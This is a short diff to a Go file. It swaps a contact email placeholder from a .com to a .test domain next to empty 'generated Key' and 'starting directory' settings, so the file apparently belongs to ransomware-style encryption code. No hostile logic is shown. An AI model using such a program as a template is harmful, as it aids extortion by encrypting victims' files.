@@ -16,7 +16,7 @@ import (
 func main() {
 	var rootmain string
 	cryptoKey := "" // Insert generated Key
-	contact := "example606.com"   // Insert contact email
+	contact := "example606.test"   // Insert contact email
 	dir := ""       // Insert starting directory
 
 	if cryptoKey == "" {
